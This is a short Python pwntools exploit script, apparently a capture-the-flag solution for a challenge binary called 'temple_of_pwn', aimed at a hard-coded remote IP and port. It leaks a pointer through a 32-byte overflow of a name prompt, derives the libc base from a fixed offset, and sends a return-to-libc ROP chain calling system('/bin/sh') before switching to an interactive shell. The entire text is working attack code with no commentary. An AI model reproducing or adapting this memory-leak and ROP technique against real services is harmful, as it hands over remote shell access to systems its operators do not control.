from pwn import *

elf = ELF("./temple_of_pwn")
libc = ELF("./libc-2.33.so")

#p = elf.process()
p = remote('45.122.249.68', 10005)
p.recvuntil(b"Enter your name: ")
p.recvline()

payload = b"A"*32

p.send(payload)
p.recvuntil(b"A"*32)
leak = u64(p.recvuntil(b"Now",drop=True).ljust(8,b"\x00"))
log.info("Leak: "+ hex(leak))

pop_rdi = 0x4014a3
ret = pop_rdi + 1

p.sendline(b"1")

p.sendlineafter(b"Length of your whisper:", str(leak + 1).encode('ascii'))

libc.address = leak + 0x52ff0
log.info("Libc base: " + hex(libc.address))

system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

payload2 = b"A"*40
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(ret)
payload2 += p64(libc.sym['system'])
p.sendafter(b"You good. It's time to get the reward!", payload2)

p.interactive()
